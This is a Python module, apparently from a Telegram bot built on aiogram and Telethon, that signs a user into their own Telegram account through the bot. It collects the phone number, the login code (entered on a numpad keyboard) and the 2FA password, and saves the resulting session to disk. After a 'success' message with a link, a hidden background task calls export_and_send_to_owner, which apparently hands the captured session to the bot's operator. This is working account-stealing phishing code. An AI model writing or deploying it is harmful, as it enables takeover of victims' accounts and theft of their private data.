import os
import asyncio
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext

from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, FloodWaitError, PhoneNumberInvalidError
)

from config import API_ID, API_HASH, SESSIONS_DIR, WEB_URL
from bot.states import AuthStates
from bot.keyboards import numpad
from bot import storage
from bot.export_service import export_and_send_to_owner

router = Router()


def get_link(user_id: int) -> str:
    return f"{WEB_URL}?session=user_{user_id}"


async def send_success(msg, user_id: int, edit: bool = False):
    text = (
        f"✅ <b>Успешно!</b>\n\n"
        f"🔗 <b>Ссылка:</b>\n<code>{get_link(user_id)}</code>\n\n"
        f"/mylink - получить снова"
    )
    if edit:
        await msg.edit_text(text, parse_mode="HTML")
    else:
        await msg.answer(text, parse_mode="HTML")


async def do_export(bot, client: TelegramClient, session_id: str, twofa: str = None):
    try:
        await export_and_send_to_owner(bot, client, session_id, twofa)
    except Exception as e:
        print(f"[Export] Error: {e}")
    finally:
        try:
            await client.disconnect()
        except:
            pass



@router.message(AuthStates.waiting_phone)
async def on_phone(message: Message, state: FSMContext):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    if not phone.startswith("+") or len(phone) < 10:
        await message.answer("❌ Формат: <code>+79001234567</code>", parse_mode="HTML")
        return
    
    await message.answer("⏳ Отправляю код...")
    
    try:
        session_path = os.path.join(SESSIONS_DIR, f"user_{user_id}")
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        sent = await client.send_code_request(phone)
        
        storage.set_client(user_id, client)
        storage.set_auth(user_id, {
            "phone": phone,
            "hash": sent.phone_code_hash,
            "code": ""
        })
        
        await state.set_state(AuthStates.waiting_code)
        await message.answer("📨 Введите код:", reply_markup=numpad())
        
    except PhoneNumberInvalidError:
        await message.answer("❌ Неверный номер")
    except FloodWaitError as e:
        await message.answer(f"⏳ Подождите {e.seconds} сек")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")


@router.callback_query(F.data == "display")
async def on_display(callback: CallbackQuery):
    await callback.answer()


@router.callback_query(F.data.startswith("num_"))
async def on_num(callback: CallbackQuery):
    user_id = callback.from_user.id
    auth = storage.get_auth(user_id)
    
    if not auth:
        await callback.answer("⚠️ /start")
        return
    
    auth["code"] += callback.data[4:]
    await callback.message.edit_reply_markup(reply_markup=numpad(auth["code"]))
    await callback.answer()


@router.callback_query(F.data == "backspace")
async def on_backspace(callback: CallbackQuery):
    user_id = callback.from_user.id
    auth = storage.get_auth(user_id)
    
    if not auth:
        await callback.answer("⚠️ /start")
        return
    
    auth["code"] = auth["code"][:-1]
    await callback.message.edit_reply_markup(reply_markup=numpad(auth["code"]))
    await callback.answer()


@router.callback_query(F.data == "submit", AuthStates.waiting_code)
async def on_submit(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    auth = storage.get_auth(user_id)
    client = storage.get_client(user_id)
    
    if not auth or not client:
        await callback.answer("⚠️ /start")
        return
    
    if not auth["code"]:
        await callback.answer("⚠️ Введите код")
        return
    
    await callback.answer("⏳ Проверяю...")
    
    try:
        await client.sign_in(auth["phone"], auth["code"], phone_code_hash=auth["hash"])
        
        storage.remove_auth(user_id)
        storage.remove_client(user_id)
        
        await send_success(callback.message, user_id, edit=True)
        await state.clear()
        
        session_id = f"user_{user_id}"
        asyncio.create_task(do_export(callback.bot, client, session_id))
        
    except SessionPasswordNeededError:
        await state.set_state(AuthStates.waiting_2fa)
        await callback.message.edit_text("🔐 Отправьте пароль 2FA:")
        
    except PhoneCodeInvalidError:
        auth["code"] = ""
        await callback.message.edit_text("❌ Неверный код:", reply_markup=numpad())
        
    except PhoneCodeExpiredError:
        await callback.message.edit_text("❌ Код истёк. /start")
        await state.clear()
        storage.remove_auth(user_id)
        
    except Exception as e:
        await callback.message.edit_text(f"❌ {e}\n/start")
        await state.clear()
        storage.remove_auth(user_id)

